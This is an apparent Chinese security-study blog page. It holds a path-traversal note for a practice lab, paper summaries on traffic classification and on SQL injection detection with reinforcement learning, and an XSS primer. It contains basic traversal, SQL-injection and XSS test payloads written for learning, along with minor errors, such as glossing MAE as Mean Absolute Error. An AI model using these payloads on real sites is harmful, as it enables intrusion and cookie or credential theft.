<h5 id="Web漏洞"><a href="#Web漏洞" class="headerlink" title="Web漏洞"></a>Web漏洞</h5><p>文件包含漏洞 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;</p>
<p>想访问的文件，与url目录文件所在的文件夹相差几个文件夹，就写几个..&#x2F;</p>
<p>如，想访问 WWW\xx.php</p>
<p>但是url所获取的是 WWW\pikachu\vul\dir\soup\1.php</p>
<p>相差四个，所以把1.php改为..&#x2F;..&#x2F;..&#x2F;..&#x2F;xx.php</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/31/Web-Basic/" data-id="cls1greba0000govf9i4u8abi" data-title="Web-Basic" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Paper-Yet Another Traffic Classifier A Masked Autoencoder Based Traffic Transformer with Multi-Level Flow Representation" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/29/Paper-Yet%20Another%20Traffic%20Classifier%20A%20Masked%20Autoencoder%20Based%20Traffic%20Transformer%20with%20Multi-Level%20Flow%20Representation/" class="article-date">
  <time class="dt-published" datetime="2024-01-29T10:15:05.000Z" itemprop="datePublished">2024-01-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/29/Paper-Yet%20Another%20Traffic%20Classifier%20A%20Masked%20Autoencoder%20Based%20Traffic%20Transformer%20with%20Multi-Level%20Flow%20Representation/">Yet Another Traffic Classifier</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="Yet-Another-Traffic-Classifier-A-Masked-Autoencoder-Based-Traffic-Transformer-with-Multi-Level-Flow-Representation-论文分享"><a href="#Yet-Another-Traffic-Classifier-A-Masked-Autoencoder-Based-Traffic-Transformer-with-Multi-Level-Flow-Representation-论文分享" class="headerlink" title="Yet Another Traffic Classifier: A Masked Autoencoder Based Traffic Transformer with Multi-Level Flow Representation 论文分享"></a>Yet Another Traffic Classifier: A Masked Autoencoder Based Traffic Transformer with Multi-Level Flow Representation 论文分享</h3><p>Zhao, R., Zhan, M., Deng, X., Wang, Y., Wang, Y., Gui, G., &amp; Xue, Z. (2023). Yet Another Traffic Classifier: A Masked Autoencoder Based Traffic Transformer with Multi-Level Flow Representation. Proceedings of the AAAI Conference on Artificial Intelligence, <em>37</em>(4), 5420-5427.</p>
<p>pdf链接：<a target="_blank" rel="noopener" href="https://ojs.aaai.org/index.php/AAAI/article/download/25674/25446">https://ojs.aaai.org/index.php/AAAI/article/download/25674/25446</a></p>
<p>另一种流量分类器:基于屏蔽自编码器的多级流表示流量转换器</p>
<h5 id="现存的基于深度学习的流量分类方法局限"><a href="#现存的基于深度学习的流量分类方法局限" class="headerlink" title="现存的基于深度学习的流量分类方法局限"></a>现存的基于深度学习的流量分类方法局限</h5><ol>
<li><h5 id="流量重复只是从原始数据包字节生成，导致在没有重要信息的情况下产生"><a href="#流量重复只是从原始数据包字节生成，导致在没有重要信息的情况下产生" class="headerlink" title="流量重复只是从原始数据包字节生成，导致在没有重要信息的情况下产生"></a>流量重复只是从原始数据包字节生成，导致在没有重要信息的情况下产生</h5></li>
<li>直接应用深度学习算法的模型结构不考虑流量特征</li>
<li>特定场景分类器培训通常需要劳动密集型和耗时的过程来标记数据</li>
</ol>
<h5 id="提出问题"><a href="#提出问题" class="headerlink" title="提出问题"></a>提出问题</h5><p>如何使分析仪器能够更准确地进行流量分类，在不同的流量中捕捉隐式的和鲁棒的模式。</p>
<h5 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h5><ol>
<li>使用带有MFR的基于MAE的交通变压器，称为YaTC，用于交通分类。 YaTC从三个角度突破了传统的流量分析方法：流量表示、分类器结构和培训策略。</li>
<li>设计了一个MFR矩阵，该矩阵充分考虑了流层次结构来表示原始流量。 为了有效地利用MFR矩阵进行流量分析，构建了一个具有数据包级和流级张位机制的新型流量变压器。 它可以以更低的复杂度和更少的参数执行更高效的特征提取。</li>
<li>应用基于MAE的自我监督学习范式来训练我们的分类器。 它首先利用大规模未标记的流量数据来学习通用的潜在重复，然后对一系列流量分类任务进行少量标记数据进行微调。</li>
<li>在五个现实世界流量数据集上评估YaTC，本文方法远远优于最先进的方法。</li>
</ol>
<h5 id="MAE"><a href="#MAE" class="headerlink" title="MAE"></a>MAE</h5><p>MAE（Mean Absolute Error）是一种用于CV（Computer Vision，计算机视觉）的自监督学习方法。自监督学习是一种无需人工标注数据的机器学习方法，它利用输入数据本身的特性来进行学习。MAE方法利用图像数据的自相似性来进行自监督学习。它首先将输入图像进行一定的变换（如旋转、缩放、裁剪等），然后利用这些变换后的图像作为输入数据进行训练。通过比较原始图像和变换后图像之间的差异来学习图像的特征和结构。</p>
<p>它的优点在于无需人工标注数据，可以利用大量的未标注图像进行训练，从而可以更好地利用数据资源。同时，MAE方法还可以提高模型的鲁棒性和泛化能力，因为它可以学习到图像的不变性特征，使模型对图像变换具有一定的鲁棒性。</p>
<p>总的来说，MAE方法是一种有效的自监督学习方法，可以提高CV模型的性能和泛化能力，同时也可以节省人工标注数据的成本和时间</p>
<h5 id="Traffc-Analysis-Methods"><a href="#Traffc-Analysis-Methods" class="headerlink" title="Traffc Analysis Methods"></a>Traffc Analysis Methods</h5><p><strong>Rule-Based Methods</strong></p>
<p>研究人员通过安全专家设计的u规则，利用流量数据的通信协议和端口号等基本属性来发现违反安全策略的行为。</p>
<p><strong>ML-Based Methods</strong></p>
<p>基于机器学习的方法，来探索流量的高维统计特征，比如通过准确度评估选择最佳统计特征，将其作为支持向量机的输入来识别网站流量，或者采用随机森林分析网站流量产生的统计特征。基于机器学习的方法结合统计特征可以分析复杂流量，但它们依赖于专家设计的统计特征，需要针对不同场景选择最优特征。</p>
<p><strong>DL-Based Methods</strong></p>
<p>基于深度学习的方法，基于原始数据包而非认为设计的特征来分析流量，已成为自动提取流量表示并实现显著性能提升的主要工具。这些方法依赖于足够多的标注训练数据，而手机和手动标注足够多的真实流量样本并不容易。</p>
<h5 id="多级流量表示法"><a href="#多级流量表示法" class="headerlink" title="多级流量表示法"></a>多级流量表示法</h5><p>从原始数据中生成多级流量代表，所作为交通分类的输入。</p>
<p>现存流量表示方法都是直接截取前面的数据流中的固定字节数形成二维矩阵，作为图像处理，通过DL算法进行分类，存在的问题：</p>
<ol>
<li>与报头相比，有效载荷的大小通常要大得多，而且充满了加密操作产生的不可力戒信息，导致矩阵中的底层语义信息过多，影响这些模型的有效性和效率。</li>
<li>在某些流量中，第一个长数据包会占据整个矩阵，因此矩阵无法包含流量中其他数据包的数据。</li>
</ol>
<p>本文提出的MFR矩阵，用格式化的二维矩阵来表示原始流量，如图1所示</p>
<ul>
<li>根据IP地址、端口号和协议雷响将原始流量分成若干流量</li>
<li>为了避免引入有偏差的互相干扰，一处流量的以太网头，将端口号设为零，并用随机地址替换IP，但保留其方向</li>
<li>捕获流量中相邻的M个数据包，并将其格式化为大小为H×W的二维矩阵，作为该流量的表示</li>
</ul>
<p>注意：</p>
<p>本文使用了原始字节作为流量的初始特征（流量表示矩阵中每个点的值），但在捕获原始流量的多层次信息时采用了特殊的设计：</p>
<ul>
<li>字节流：流量表示矩阵的每一行只包含一种流量字节，分为标题行和有效载荷行</li>
<li>数据包级：每个数据包由报头矩阵和有效载荷矩阵表示，形成大小为H&#x2F;M*W的数据包级矩阵</li>
<li>流量级：由于流量是由有序的数据包组成的美因茨M个相邻的数据包级矩阵会在第二维度上叠加，形成最终的MFR矩阵</li>
</ul>
<p>这样，每一层的信息都是固定的，不会出现低层信息溢出而导致高层信息丢失的情况</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/850e3c29-2efe-44db-add9-bb5793e7f181" alt="image"></p>
<p>数据处理的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> scapy.<span class="built_in">all</span> <span class="keyword">as</span> scapy</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makedir</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.mkdir(path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> E:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_5hp_list</span>(<span class="params">pcap_dir</span>):</span><br><span class="line">    packets = scapy.rdpcap(pcap_dir)</span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> packet <span class="keyword">in</span> packets:</span><br><span class="line">        header = (binascii.hexlify(<span class="built_in">bytes</span>(packet[<span class="string">&#x27;IP&#x27;</span>]))).decode()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = (binascii.hexlify(<span class="built_in">bytes</span>(packet[<span class="string">&#x27;Raw&#x27;</span>]))).decode()</span><br><span class="line">            header = header.replace(payload, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(header) &gt; <span class="number">160</span>:</span><br><span class="line">            header = header[:<span class="number">160</span>]</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(header) &lt; <span class="number">160</span>:</span><br><span class="line">            header += <span class="string">&#x27;0&#x27;</span> * (<span class="number">160</span> - <span class="built_in">len</span>(header))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(payload) &gt; <span class="number">480</span>:</span><br><span class="line">            payload = payload[:<span class="number">480</span>]</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(payload) &lt; <span class="number">480</span>:</span><br><span class="line">            payload += <span class="string">&#x27;0&#x27;</span> * (<span class="number">480</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">        data.append((header, payload))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data) &gt;= <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>-<span class="built_in">len</span>(data)):</span><br><span class="line">            data.append((<span class="string">&#x27;0&#x27;</span>*<span class="number">160</span>, <span class="string">&#x27;0&#x27;</span>*<span class="number">480</span>))</span><br><span class="line">    final_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> h, p <span class="keyword">in</span> data:</span><br><span class="line">        final_data += h</span><br><span class="line">        final_data += p</span><br><span class="line">    <span class="keyword">return</span> final_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MFR_generator</span>(<span class="params">flows_pcap_path, output_path</span>):</span><br><span class="line">    flows = glob.glob(flows_pcap_path + <span class="string">&quot;/*/*/*.pcap&quot;</span>)</span><br><span class="line">    makedir(output_path)</span><br><span class="line">    makedir(output_path + <span class="string">&quot;/train&quot;</span>)</span><br><span class="line">    makedir(output_path + <span class="string">&quot;/test&quot;</span>)</span><br><span class="line">    classes = glob.glob(flows_pcap_path + <span class="string">&quot;/*/*&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> cla <span class="keyword">in</span> tqdm(classes):</span><br><span class="line">        makedir(cla.replace(flows_pcap_path,output_path))</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> tqdm(filenames):</span><br><span class="line">        content = read_5hp_list(filename)</span><br><span class="line">        content = numpy.array([<span class="built_in">int</span>(content[i:i + <span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(content), <span class="number">2</span>)])</span><br><span class="line">        fh = numpy.reshape(content, (<span class="number">40</span>, <span class="number">40</span>))</span><br><span class="line">        fh = numpy.uint8(fh)</span><br><span class="line">        im = Image.fromarray(fh)</span><br><span class="line">        im.save(filename.replace(<span class="string">&#x27;.pcap&#x27;</span>,<span class="string">&#x27;.png&#x27;</span>).replace(flows_pcap_path,output_path))</span><br></pre></td></tr></table></figure>

<p><strong>makedir</strong>：创建一个新的目录。它接受一个参数<code>path</code>，表示要创建的目录的路径。函数首先尝试使用<code>os.mkdir()</code>函数创建目录，如果出现任何异常则将其捕获并忽略，不做任何处理。这样可以确保即使在创建目录时出现问题，程序也不会中断。</p>
<p><strong>read_5hp_list</strong>：首先使用<code>scapy.rdpcap()</code>函数读取pcap文件，然后遍历每个数据包。对于每个数据包，它提取IP头部的十六进制表示，并尝试提取原始数据Raw十六进制表示。如果数据包中没有原始数据，则将payload设为空字符串。然后根据特定的长度要求对header和payload进行处理，确保它们的长度符合要求。接下来，函数将处理后的header和payload添加到一个列表<code>data</code>中，如果列表长度超过5，则停止添加。如果列表长度不足5，则补充空数据。最后，函数将列表中的数据拼接成一个字符串<code>final_data</code>，并返回<code>final_data</code>字符串。</p>
<p><strong>MFR_generator</strong>：函数接受两个参数<code>flows_pcap_path</code>和<code>output_path</code>，分别表示pcap文件所在的路径和输出路径。首先，函数使用<code>glob.glob()</code>函数获取<code>flows_pcap_path</code>目录下所有子目录中的pcap文件，并存储在名为<code>flows</code>的列表中。然后使用自定义函数<code>makedir()</code>创建输出路径及其子目录。接下来，函数遍历<code>classes</code>列表中的每个类别，对每个类别都调用<code>makedir()</code>函数创建相应的子目录。然后，函数遍历<code>filenames</code>列表中的每个文件，对每个文件都调用<code>read_5hp_list()</code>函数读取数据，并将数据转换成特定格式的图像文件。这里使用了<code>numpy</code>库将数据转换成数组，并使用<code>Image</code>库创建图像对象，并最终保存为png格式的图像文件</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/29/Paper-Yet%20Another%20Traffic%20Classifier%20A%20Masked%20Autoencoder%20Based%20Traffic%20Transformer%20with%20Multi-Level%20Flow%20Representation/" data-id="clrys4xho00007cvff5aw7pku" data-title="Yet Another Traffic Classifier" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Paper-SQIRL Grey-Box Detection of SQL Injection Vulnerabilities Using Reinforcement Learning" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/27/Paper-SQIRL%20Grey-Box%20Detection%20of%20SQL%20Injection%20Vulnerabilities%20Using%20Reinforcement%20Learning/" class="article-date">
  <time class="dt-published" datetime="2024-01-27T13:10:28.000Z" itemprop="datePublished">2024-01-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/27/Paper-SQIRL%20Grey-Box%20Detection%20of%20SQL%20Injection%20Vulnerabilities%20Using%20Reinforcement%20Learning/">SQIRL</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="SQIRL-Grey-Box-Detection-of-SQL-Injection-Vulnerabilities-Using-Reinforcement-Learning-论文分享"><a href="#SQIRL-Grey-Box-Detection-of-SQL-Injection-Vulnerabilities-Using-Reinforcement-Learning-论文分享" class="headerlink" title="SQIRL: Grey-Box Detection of SQL Injection Vulnerabilities Using Reinforcement Learning 论文分享"></a>SQIRL: Grey-Box Detection of SQL Injection Vulnerabilities Using Reinforcement Learning 论文分享</h3><p>Wahaibi, S. A., Foley, M., &amp; Maffeis, S. (2023). SQIRL: Grey-Box Detection of SQL Injection Vulnerabilities Using Reinforcement Learning. <em>32nd USENIX Security Symposium (USENIX Security 23)</em>, 6097–6114.</p>
<p>pdf链接：<a href="">usenix.org&#x2F;system&#x2F;files&#x2F;usenixsecurity23-al-wahaibi.pdf</a></p>
<p>SQIRL：使用强化学习的SQL注入漏洞灰盒检测</p>
<p>SQIRL是一种基于深度强化学习，使用多个工作代理和灰盒反馈来检测SQL注入漏洞的新方法，使用单个代理来学习如何修正SQL语法、转义上下文和绕过sanitisation。</p>
<h5 id="现存的SQL注入漏洞扫描器局限"><a href="#现存的SQL注入漏洞扫描器局限" class="headerlink" title="现存的SQL注入漏洞扫描器局限"></a>现存的SQL注入漏洞扫描器局限</h5><ol>
<li>漏洞扫描器通常用于在投入生产之前找到漏洞，但是它们有时依赖于错误处理和网页上的SQL查询的反馈，导致在不存在错误时的有效性不高</li>
<li>现有的扫描器使用简单的基于规则的方法来覆盖最常见的SQL注入有效载荷，但是这些有效载荷缺乏多样性，并且无法根据特定的网络应用程序来制定有效载荷，导致扫描器忽略了合法的漏洞</li>
</ol>
<h5 id="提出问题"><a href="#提出问题" class="headerlink" title="提出问题"></a>提出问题</h5><p>如何生成针对每个注入点、特定上下文和防御的有效载荷</p>
<h5 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h5><ol>
<li><p>为代理实现一个强化学习(RL)环境，为SQL注入模糊Web应用程序，通过我们扩展的最先进的爬虫识别输入。</p>
</li>
<li><p>设计并实现了SQIRL，一种新的深度强化学习模糊方法。单个RL代理完成SQL注入的三项任务：语法修复、上下文转义和清理旁路，并且让这些工作在知识在代理之间共享。</p>
</li>
</ol>
<h5 id="强化学习-RL"><a href="#强化学习-RL" class="headerlink" title="强化学习(RL)"></a>强化学习(RL)</h5><p>强化学习的主要思想是通过与环境的交互，基于奖励和惩罚来学习如何最好地完成任务，以实现长期累积奖励的最大化。在这个过程中，智能体通过尝试不同的行为，并根据获得的奖励和惩罚来调整自己的策略，以最大化长期累积奖励。强化学习考虑的是长期累积奖励，而不仅仅是即时奖励，因此智能体需要学会通过一系列看似不相关的行为来最大化长期奖励。此外，智能体还需要在探索和利用之间找到平衡，以最大化长期奖励。强化学习通常使用马尔科夫决策过程（MDP）来建模决策问题，其中包括状态、动作、奖励和转移概率。通过学习价值函数或策略函数来决定在每个状态下应该采取什么样的行动，以最大化长期奖励。</p>
<h5 id="联邦学习-FL"><a href="#联邦学习-FL" class="headerlink" title="联邦学习(FL)"></a>联邦学习(FL)</h5><p>联邦学习是多个客户端模型在一段时间内独立训练，将学习得到的参数发送给中央服务器模型，服务器模型对得到的参数进行汇总（通常是求平均值），然乎将汇总后的参数发送给客户端，客户端使用新的参数进行训练，直至模型收敛。</p>
<h5 id="查找SQL注入漏洞的主要步骤"><a href="#查找SQL注入漏洞的主要步骤" class="headerlink" title="查找SQL注入漏洞的主要步骤"></a>查找SQL注入漏洞的主要步骤</h5><ol>
<li>识别可能容易受到SQL注入影响的输入位置。包括URL、输入标签和与网页相关的动态链接元素。</li>
<li>一旦找到输入位置，就可以制作相关的有效负载。</li>
</ol>
<p>有效负载必须满足4个标准才能触发SQL注入</p>
<ul>
<li><p>生成语法有效的SQL，以避免执行错误</p>
</li>
<li><p>转义预期的SQL上下文</p>
</li>
<li><p>绕过应用于有效负载的任何基于黑名单的过滤</p>
</li>
<li><p>更改SQL语句的预期行为。例如，假设没有过滤，表1中红色显示的有效载荷会转义’并执行SLEEP语句。</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0f058974-865d-4a4f-8cf1-29ff27da0e9e" alt="image"></p>
</li>
</ul>
<h5 id="SQIRL实现"><a href="#SQIRL实现" class="headerlink" title="SQIRL实现"></a>SQIRL实现</h5><p>SQIRL架构</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3523614b-07ed-4d5d-968f-738f244d7148" alt="image"></p>
<p><strong>RL环境</strong></p>
<p>绿色部分是RL代理，计算当前有效载荷的突变。RL环境将Web应用程序抽象为RL代理，作为接受操作并返回观察结果的组件，它需要抓取Web应用程序和监控SQL数据库，提供反馈机制没允许代理学习如何定制SQL注入有效载荷。</p>
<p><strong>SQl  Proxy</strong></p>
<p>SQL代理从数据库日志文件中检索SQL语句，用于SQIRL的抓取和模糊阶段。</p>
<p><strong>State &amp; Extrinsic Reward</strong></p>
<p>时刻 t 的状态由三个不同的部分组成：在t−1时刻注入的有效载荷；在时间t−1时从SQL代理中提取的SQL语句(在出现错误且没有新的SQL语句的情况下，本文使用在t−2时捕获的SQL语句)；如果在前一个时间步骤中出现SQL错误，则使用bit来标记。为了减少可能状态的空间，并鼓励泛化，有效负载和SQL语句被转换为通用形式：字符串和整数值分别被通用令牌STR和INT替换。</p>
<p>这部分涉及一个算法，用于计算奖励、终止条件和下一局的过渡函数。</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0603f880-5e98-45a9-93db-d8ce70260d10" alt="image"></p>
<p>如果没有发生错误，检测有效载荷是否更改了SQL的行为，出发成功的终止条件并奖励0。假如，SLEEP关键字八日注入，并且在预期的上下文之外没有进行过滤，这就是一个合法的SQL注入有效载荷，但是如果有效负载无法逃离上下文，被清理，不改变已执行的SQL的行为或者导致SQL语法错误，提供-1的奖励。过度函数中的行为更改、清理和专业上下文条件作为合法检查和正则表达式实现。</p>
<p><strong>Payload Control Module</strong></p>
<p>本地代理通过有效载荷控制模块(PCM)与Web应用程序交互。PCM将一个动作转换为具体的有效载荷，并将其注入Web应用中，计算结果状态和奖励，反馈给相关代理。</p>
<p>生成具体有效载荷的操作</p>
<ul>
<li>上下文转义：从有效载荷中添加或删除基本令牌，如’，#，1&#x3D;1，SELECT</li>
<li>行为更改：从有效载荷中添加或删除行为更改令牌，如AND SLEEP(0)，WHERE SLEEP(0)，SLEEP(0)</li>
<li>过滤转义：更改现有有效载荷令牌，如通过关键字大小写(SeLect)、字符令牌(CHAR(20))和注释空白</li>
</ul>
<p>这张表是SQL有效负载和语句的令牌空间</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/79a4be87-25ad-4d7c-aec9-ca270050aa6a" alt="image"></p>
<p><strong>Local Worker</strong></p>
<p>SQIRL的核心，包含处理操作、状态和执行主要学习任务的逻辑。</p>
<p><strong>Global Agent</strong></p>
<p>全局代理包含全局策略，使用代理从同一目标的独立互动中收集不同的行为</p>
<p>SQIRL生成的有效载荷通用表示法</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ca145107-7404-4532-95c5-3fde1ab363f7" alt="image"></p>
<h5 id="本文的局限性"><a href="#本文的局限性" class="headerlink" title="本文的局限性"></a>本文的局限性</h5><p>SQIRL使用SQL数据库中的信息，但无法访问网络应用程序的源代码，是一种灰盒工具，不需要依赖在网页上泄露错误信息就能发现漏洞，但是针对已部署网络应用程序的恶意行为无效。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/27/Paper-SQIRL%20Grey-Box%20Detection%20of%20SQL%20Injection%20Vulnerabilities%20Using%20Reinforcement%20Learning/" data-id="clrw3efvq0000ekvffk19eyta" data-title="SQIRL" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Web-XSS1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/26/Web-XSS1/" class="article-date">
  <time class="dt-published" datetime="2024-01-26T09:14:45.000Z" itemprop="datePublished">2024-01-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/26/Web-XSS1/">XSS1-原理分类及攻击手法</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="XSS跨站之原理分类及攻击手法"><a href="#XSS跨站之原理分类及攻击手法" class="headerlink" title="XSS跨站之原理分类及攻击手法"></a>XSS跨站之原理分类及攻击手法</h4><p><strong>XSS跨站漏洞产生的原理</strong></p>
<p>往浏览器页面中插入恶意的HTML代码，比如说js、css、html标签等，当用户浏览该页面时，嵌入其中的恶意代码会执行，达到攻击用户的目的，比如说获取用户浏览器信息等。</p>
<p><strong>XSS漏洞攻击的危害</strong></p>
<ul>
<li>盗取各类用户[账号，如机器登录帐号、用户网银帐号、各类管理员帐号</li>
<li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li>
<li>盗窃企业重要的具有商业价值的资料</li>
<li>非法转账</li>
<li>强制发送电子邮件</li>
<li>网站挂马</li>
<li>控制受害者机器向其它网站发起攻击（重定向语句）</li>
<li>窃取cookie的sessionid，冒充登录。</li>
</ul>
<p>XSS攻击利用到最大就需要自己有台服务器用于窃取信息，还要利用一点社工，骗取别人点击恶意的链接。</p>
<p>XSS跨站漏洞执行的代码是js代码，产生层面是前端，有关的函数是一些输出函数（alert、print等）</p>
<p>XSS跨站漏洞分类：反射，存储，DOM</p>
<p>跨站测试代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#&#x27; onclick=&quot;alert(2)&quot;&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>使用后端来运行代码（反射型和存储型），得手动分析来测试是什么问题</p>
<p><strong>XSS漏洞的分类</strong></p>
<p><strong>1.DOM型</strong>(不经过服务器，前端js代码的利用)：</p>
<p>DOM型是针对前端代码的（有的页面跳转不是在url执行，是在HTML中执行），可以直接从源代码中发现存在XSS漏洞</p>
<p>DOM树</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/30396902-51e8-403c-86a6-522d6dcb129f" alt="image"></p>
<p>本地利用漏洞，这种漏洞存在于页面中客户端脚本自身。其攻击过程如下所示：</p>
<p>Alice给Bob发送一个恶意构造了Web的URL。</p>
<p>Bob点击并查看了这个URL。</p>
<p>恶意页面中的JavaScript打开一个具有漏洞的HTML页面并将其安装在Bob电脑上。</p>
<p>具有漏洞的HTML页面包含了在Bob电脑本地域执行的JavaScript。</p>
<p>Alice的恶意脚本可以在Bob的电脑上执行Bob所持有的权限下的命令。</p>
<p><strong>2.反射型：</strong></p>
<p>反射型XSS有get和post型，攻击产生一次，攻击的语句不会存储到对方的服务器</p>
<p>这种漏洞和类型A有些类似，不同的是Web客户端使用Server端脚本生成页面为用户提供数据时，如果未经验证的用户数据被包含在页面中而未经HTML实体编码，客户端代码便能够注入到动态页面中。</p>
<p>其攻击过程如下：</p>
<p>Alice经常浏览某个网站，此网站为Bob所拥有。Bob的站点运行Alice使用用户名&#x2F;密码进行登录，并存储敏感信息(比如银行帐户信息)。</p>
<p>Charly发现Bob的站点包含反射性的XSS漏洞。</p>
<p>Charly编写一个利用漏洞的URL，并将其冒充为来自Bob的邮件发送给Alice。</p>
<p>Alice在登录到Bob的站点后，浏览Charly提供的URL。</p>
<p>嵌入到URL中的恶意脚本在Alice的浏览器中执行，就像它直接来自Bob的服务器一样。此脚本盗窃敏感信息(授权、信用卡、帐号信息等)然后在Alice完全不知情的情况下将这些信息发送到Charly的Web站点。</p>
<p><strong>3.存储型（长久型，危害最大）：</strong></p>
<p>存储型XSS，输入一行攻击脚本后，每次刷新页面都会攻击，攻击语句存储到对方的服务器了</p>
